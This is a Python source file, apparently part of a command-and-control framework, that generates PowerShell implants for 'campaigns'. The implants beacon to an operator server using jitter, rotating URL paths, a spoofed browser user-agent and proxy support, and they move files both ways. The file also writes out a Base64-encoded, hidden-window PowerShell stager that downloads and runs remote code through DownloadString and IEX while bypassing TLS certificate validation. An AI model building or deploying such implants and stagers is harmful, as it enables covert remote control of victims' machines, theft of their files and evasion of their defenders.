import os
import base64
import json
import time
import importlib.util
import shutil
from pathlib import Path

def generate_agent_code(server_address, beacon_path="/beacon", cmd_result_path="/command_result", rotation_info=None, agent_config=None):
    """Generate PowerShell agent code with secure key exchange and dynamic path rotation"""
    # Ensure all paths have leading slashes
    if not beacon_path.startswith('/'):
        beacon_path = '/' + beacon_path
    if not cmd_result_path.startswith('/'):
        cmd_result_path = '/' + cmd_result_path
    
    # Add path rotation code if rotation info is provided
    rotation_enabled = rotation_info is not None
    if rotation_info:
        rotation_id = str(rotation_info.get('current_rotation_id', 0))
        next_rotation = str(rotation_info.get('next_rotation_time', 0))
        rotation_interval = str(rotation_info.get('rotation_interval', 3600))
        
        # Extract path pool from rotation info
        path_pool = rotation_info.get('current_paths', {}).get('path_pool', [])
        if path_pool:
            path_pool_str = "'" + "', '".join(path_pool) + "'"
            path_pool_code = f"$global:pathPool = @({path_pool_str})"
        else:
            path_pool_code = "$global:pathPool = @()"
    else:
        rotation_id = "0"
        next_rotation = str(int(time.time()) + 3600)
        rotation_interval = "3600"
        path_pool_code = "$global:pathPool = @()"
    
    # Use provided agent config or defaults
    if agent_config is None:
        agent_config = {}
        
    # Default agent configuration values with fallbacks
    beacon_interval = agent_config.get('beacon_period', 5)
    jitter_percentage = agent_config.get('jitter_percentage', 20)
    max_failures = agent_config.get('max_failures_before_fallback', 3)
    max_backoff = agent_config.get('max_backoff_time', 10)
    
    # Random sleep is now optional
    random_sleep_enabled = agent_config.get('random_sleep_enabled', False)
    max_sleep_time = agent_config.get('max_sleep_time', 10)
    
    # Convert booleans to PowerShell format
    random_sleep_enabled_ps = "$true" if random_sleep_enabled else "$false"
    
    user_agent = agent_config.get('user_agent', "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36")
    username = agent_config.get('username', "")
    password = agent_config.get('password', "")
    proxy_enabled = agent_config.get('proxy_enabled', False)
    proxy_enabled_ps = "$true" if proxy_enabled else "$false"
    proxy_type = agent_config.get('proxy_type', "system")
    proxy_server = agent_config.get('proxy_server', "")
    proxy_port = agent_config.get('proxy_port', "")
    
    # Get file operation paths
    file_upload_path = rotation_info.get('current_paths', {}).get('file_upload_path', '/file_upload') if rotation_info else '/file_upload'
    file_request_path = rotation_info.get('current_paths', {}).get('file_request_path', '/file_request') if rotation_info else '/file_request'
    
    # Generate the agent using the templates
    agent_code = generate_from_templates(
        server_address=server_address,
        beacon_path=beacon_path,
        cmd_result_path=cmd_result_path,
        file_upload_path=file_upload_path,
        file_request_path=file_request_path,
        rotation_enabled=rotation_enabled,
        rotation_id=rotation_id,
        next_rotation_time=next_rotation,
        rotation_interval=rotation_interval,
        beacon_interval=beacon_interval,
        jitter_percentage=jitter_percentage,
        max_failures=max_failures,
        max_backoff=max_backoff,
        random_sleep_enabled=random_sleep_enabled_ps,
        max_sleep_time=max_sleep_time,
        user_agent=user_agent,
        username=username,
        password=password,
        proxy_enabled=proxy_enabled_ps,
        proxy_type=proxy_type,
        proxy_server=proxy_server,
        proxy_port=proxy_port,
        path_pool_code=path_pool_code  # Add path pool code to template variables
    )
    
    return agent_code

def generate_pwsh_base64_str(host, port, ssl, campaign_folder):
    """
    Generate a Base64 encoded PowerShell agent stager
    
    Args:
        host: Server hostname or IP
        port: Server port
        ssl: Whether to use SSL/TLS
        campaign_folder: Path to the campaign folder
        
    Returns:
        String containing the generated PowerShell Base64 command
    """
    agents_folder = os.path.join(campaign_folder, "agents")
    os.makedirs(agents_folder, exist_ok=True)
    
    # Extract campaign name from folder path
    campaign_name = os.path.basename(campaign_folder).replace("_campaign", "")
    
    # Get custom URL paths from url_paths.json if it exists
    url_paths_file = os.path.join(campaign_folder, "url_paths.json")
    url_paths = {
        "beacon_path": "/beacon",
        "agent_path": "/raw_agent",
        "stager_path": "/b64_stager",
        "cmd_result_path": "/command_result",
        "file_upload_path": "/file_upload",
        "file_request_path": "/file_request"
    }
    
    if os.path.exists(url_paths_file):
        try:
            with open(url_paths_file, 'r') as f:
                custom_paths = json.load(f)
                # Update with custom paths
                for key, path in custom_paths.items():
                    if key in url_paths:
                        url_paths[key] = path
        except Exception as e:
            print(f"Warning: Could not load URL paths: {e}")
    
    # Make sure all paths start with a leading slash
    for key in url_paths:
        if not url_paths[key].startswith('/'):
            url_paths[key] = '/' + url_paths[key]
    
    http = "https" if ssl else "http"
    server_address = f"{host}:{port}"
    
    # Get agent configuration
    agent_config = {}
    
    # Try to load agent config
    agent_config_file = os.path.join(campaign_folder, "agent_config.json")
    if os.path.exists(agent_config_file):
        try:
            with open(agent_config_file, 'r') as f:
                agent_config = json.load(f)
                # Log that we loaded the config
                print(f"Loaded agent configuration from {agent_config_file}")
        except Exception as e:
            print(f"Warning: Could not load agent config: {e}")
    
    # Read path rotation configuration
    rotation_enabled = True  # Default
    rotation_interval = 3600  # Default
    rotation_id = 0  # Default
    next_rotation_time = int(time.time()) + rotation_interval  # Default
    
    # Try to load path rotation state
    path_rotation_file = os.path.join(campaign_folder, "path_rotation_state.json")
    if os.path.exists(path_rotation_file):
        try:
            with open(path_rotation_file, 'r') as f:
                rotation_state = json.load(f)
                rotation_id = rotation_state.get("rotation_counter", 0)
                next_rotation_time = rotation_state.get("next_rotation_time", next_rotation_time)
                rotation_interval = rotation_state.get("rotation_interval", rotation_interval)
                
                # Get path pool if available
                path_pool = rotation_state.get("current_paths", {}).get("path_pool", [])
                if path_pool:
                    path_pool_str = "'" + "', '".join(path_pool) + "'"
                    path_pool_code = f"$global:pathPool = @({path_pool_str})"
                else:
                    path_pool_code = "$global:pathPool = @()"
        except Exception as e:
            print(f"Warning: Could not load path rotation state: {e}")
            path_pool_code = "$global:pathPool = @()"
    else:
        path_pool_code = "$global:pathPool = @()"
    
    # Convert boolean values to PowerShell format
    random_sleep_enabled = agent_config.get("random_sleep_enabled", False)
    random_sleep_enabled_ps = "$true" if random_sleep_enabled else "$false"
    
    proxy_enabled = agent_config.get("proxy_enabled", False)
    proxy_enabled_ps = "$true" if proxy_enabled else "$false"
    
    # Create rotation info structure
    rotation_info = {
        "current_rotation_id": rotation_id,
        "next_rotation_time": next_rotation_time,
        "rotation_interval": rotation_interval,
        "current_paths": url_paths
    }
    
    # Generate agent code using templates with additional parameters
    agent_ps1 = generate_from_templates(
        server_address=server_address,
        beacon_path=url_paths["beacon_path"],
        cmd_result_path=url_paths["cmd_result_path"],
        file_upload_path=url_paths["file_upload_path"],
        file_request_path=url_paths["file_request_path"],
        rotation_enabled=rotation_enabled,
        rotation_id=str(rotation_id),
        next_rotation_time=str(next_rotation_time),
        rotation_interval=str(rotation_interval),
        beacon_interval=agent_config.get("beacon_period", 5),
        jitter_percentage=agent_config.get("jitter_percentage", 20),
        max_failures=agent_config.get("max_failures_before_fallback", 3),
        max_backoff=agent_config.get("max_backoff_time", 10),
        random_sleep_enabled=random_sleep_enabled_ps,
        max_sleep_time=agent_config.get("max_sleep_time", 10),
        user_agent=agent_config.get("user_agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36"),
        username=agent_config.get("username", ""),
        password=agent_config.get("password", ""),
        proxy_enabled=proxy_enabled_ps,
        proxy_type=agent_config.get("proxy_type", "system"),
        proxy_server=agent_config.get("proxy_server", ""),
        proxy_port=agent_config.get("proxy_port", ""),
        url_paths=url_paths,
        path_pool_code=path_pool_code
    )
        
    # Create the Base64 stager with improved security for first contact
    stager_path = url_paths["stager_path"]
    base_agent = f"$V=new-object net.webclient;$S=$V.DownloadString('{http}://{server_address}{stager_path}');IEX($S)"
    
    # Add SSL certificate validation bypass if using SSL
    if ssl:
        stager = (
            "[System.Net.ServicePointManager]::SecurityProtocol = [System.Net.SecurityProtocolType]::Tls12;\n"
            "[System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true};\n"
            "try {\n"
            f"    {base_agent}\n"
            "} catch {\n"
            "    $errorMessage = $_.Exception.Message\n"
            "    $errorDetails = $_ | Format-List -Force | Out-String\n"
            "    Write-Host \"Error connecting to C2: $errorMessage`n$errorDetails\"\n"
            "}"
        )
    else:
        stager = base_agent
    
    # Encode the stager
    encoded = base64.b64encode(stager.encode("UTF-8")).decode("UTF-8")
    powershell_command = f"powershell -w hidden \"iex([System.Text.Encoding]::ASCII.GetString([System.Convert]::FromBase64String('{encoded}')))\""
    
    # Save the full agent code to the agents folder
    agent_file_path = os.path.join(agents_folder, "powershell_agent.ps1")
    with open(agent_file_path, 'w') as f:
        f.write(agent_ps1)
    
    # Create a more detailed information about the agent
    details = (
        f"Powershell Base64 Agent Details:\n"
        f"1. Base Command: {powershell_command}\n"
        f"2. Encryption: Dynamic key exchange with secure first contact\n"
        f"3. System Identification: Sent only after secure channel established\n"
        f"4. SSL Validation: {'Certificate validation bypassed (required for self-signed certs)' if ssl else 'No SSL used'}\n"
        f"5. Communication Paths:\n"
        f"   - Beacon URL: {http}://{server_address}{url_paths['beacon_path']}\n"
        f"   - Agent Download URL: {http}://{server_address}{url_paths['agent_path']}\n"
        f"   - Stager URL: {http}://{server_address}{url_paths['stager_path']}\n"
        f"   - Command Result URL: {http}://{server_address}{url_paths['cmd_result_path']}\n"
        f"   - File Upload URL: {http}://{server_address}{url_paths['file_upload_path']}\n"
        f"   - File Request URL: {http}://{server_address}{url_paths['file_request_path']}\n"
        f"6. User-Agent: {agent_config.get('user_agent', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36')}\n"
        f"7. Beacon Configuration:\n"
        f"   - Interval: {agent_config.get('beacon_period', 5)} seconds\n" 
        f"   - Jitter: {agent_config.get('jitter_percentage', 20)}%\n"
        f"   - Random Sleep: {'Enabled' if random_sleep_enabled else 'Disabled'}\n"
        f"   - Max Sleep Time: {agent_config.get('max_sleep_time', 10)} seconds\n"
        f"   - Path Rotation: {'Enabled' if rotation_enabled else 'Disabled'}\n"
        f"   - Rotation Interval: {rotation_interval} seconds\n"
        f"8. Proxy Settings:\n"
        f"   - Proxy Enabled: {agent_config.get('proxy_enabled', False)}\n"
        f"   - Proxy Type: {agent_config.get('proxy_type', 'system')}\n"
        f"   - Server: {agent_config.get('proxy_server', '')}\n"
        f"   - Port: {agent_config.get('proxy_port', '')}\n"
        f"9. Authentication:\n"
        f"   - Username: {'Configured' if agent_config.get('username', '') else 'Not used'}\n"
        f"   - Password: {'Configured' if agent_config.get('password', '') else 'Not used'}\n"
    )
    
    # Save detailed information
    details_file_path = os.path.join(agents_folder, "powershell_base64.txt")
    with open(details_file_path, 'w') as f:
        f.write(details)
    
    result = f"Powershell Base64:\n{powershell_command}\n\nEncryption: Dynamic key exchange with secure first contact\nSecurity: No system information sent until encrypted channel established"
    
    return f"Powershell Base64 agent generated and saved to {details_file_path}\n{result}"

def generate_from_templates(server_address, beacon_path, cmd_result_path,
                           rotation_enabled, rotation_id, next_rotation_time, rotation_interval,
                           beacon_interval, jitter_percentage, max_failures, max_backoff,
                           random_sleep_enabled="$false", max_sleep_time=10, user_agent="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
                           username="", password="", proxy_enabled="$false", proxy_type="system",
                           proxy_server="", proxy_port="", url_paths=None, file_upload_path=None, file_request_path=None, path_pool_code="$global:pathPool = @()"):
    """Generate the PowerShell agent code from templates with all options"""
    
    # Get template paths
    script_dir = os.path.dirname(os.path.abspath(__file__))
    helpers_dir = os.path.join(os.path.dirname(script_dir), "helpers", "powershell")
    
    agent_template_path = os.path.join(helpers_dir, "agent.template.ps1")
    path_rotation_template_path = os.path.join(helpers_dir, "path_rotation.template.ps1")
    file_operations_template_path = os.path.join(helpers_dir, "file_operations.template.ps1")
    
    # Ensure template files exist
    if not os.path.exists(agent_template_path):
        raise FileNotFoundError(f"Agent template not found: {agent_template_path}")
    if not os.path.exists(path_rotation_template_path):
        raise FileNotFoundError(f"Path rotation template not found: {path_rotation_template_path}")
    
    # Load templates
    with open(agent_template_path, 'r') as f:
        agent_template = f.read()
    with open(path_rotation_template_path, 'r') as f:
        path_rotation_template = f.read()
    
    # Load file operations template if it exists
    file_operations_code = ""
    if os.path.exists(file_operations_template_path):
        with open(file_operations_template_path, 'r') as f:
            file_operations_code = f.read()
    else:
        print(f"Warning: File operations template not found: {file_operations_template_path}")
    
    # Use provided file paths or extract from url_paths dictionary
    if file_upload_path is None and url_paths and "file_upload_path" in url_paths:
        file_upload_path = url_paths["file_upload_path"]
    
    if file_request_path is None and url_paths and "file_request_path" in url_paths:
        file_request_path = url_paths["file_request_path"]
    
    # Use default fallback values if still None
    if file_upload_path is None:
        file_upload_path = "/file_upload"
    
    if file_request_path is None:
        file_request_path = "/file_request"
    
    # Fill in the path rotation template
    path_rotation_code = ""
    if rotation_enabled:
        path_rotation_code = path_rotation_template
        path_rotation_code = path_rotation_code.replace("{{ROTATION_ID}}", str(rotation_id))
        path_rotation_code = path_rotation_code.replace("{{NEXT_ROTATION_TIME}}", str(next_rotation_time))
        path_rotation_code = path_rotation_code.replace("{{ROTATION_INTERVAL}}", str(rotation_interval))
        path_rotation_code = path_rotation_code.replace("{{BEACON_PATH}}", beacon_path)
        path_rotation_code = path_rotation_code.replace("{{CMD_RESULT_PATH}}", cmd_result_path)
        
        # Include file upload and request paths
        path_rotation_code = path_rotation_code.replace("{{FILE_UPLOAD_PATH}}", file_upload_path)
        path_rotation_code = path_rotation_code.replace("{{FILE_REQUEST_PATH}}", file_request_path)
        
        # Update path pool with the provided path pool code
        path_rotation_code = path_rotation_code.replace("$global:pathPool = @()", path_pool_code)
    
    # Fill in the agent template with all values
    agent_code = agent_template
    agent_code = agent_code.replace("{{SERVER_ADDRESS}}", server_address)
    agent_code = agent_code.replace("{{BEACON_PATH}}", beacon_path)
    agent_code = agent_code.replace("{{CMD_RESULT_PATH}}", cmd_result_path)
    agent_code = agent_code.replace("{{PATH_ROTATION_CODE}}", path_rotation_code)
    agent_code = agent_code.replace("{{FILE_OPERATIONS_CODE}}", file_operations_code)
    agent_code = agent_code.replace("{{BEACON_INTERVAL}}", str(beacon_interval))
    agent_code = agent_code.replace("{{JITTER_PERCENTAGE}}", str(jitter_percentage))
    agent_code = agent_code.replace("{{MAX_FAILURES}}", str(max_failures))
    agent_code = agent_code.replace("{{MAX_BACKOFF}}", str(max_backoff))
    agent_code = agent_code.replace("{{RANDOM_SLEEP_ENABLED}}", random_sleep_enabled)
    agent_code = agent_code.replace("{{MAX_SLEEP_TIME}}", str(max_sleep_time))
    agent_code = agent_code.replace("{{USER_AGENT}}", user_agent)
    agent_code = agent_code.replace("{{USERNAME}}", username)
    agent_code = agent_code.replace("{{PASSWORD}}", password)
    agent_code = agent_code.replace("{{PROXY_ENABLED}}", proxy_enabled)
    agent_code = agent_code.replace("{{PROXY_TYPE}}", proxy_type)
    agent_code = agent_code.replace("{{PROXY_SERVER}}", proxy_server)
    agent_code = agent_code.replace("{{PROXY_PORT}}", proxy_port)
    
    return agent_code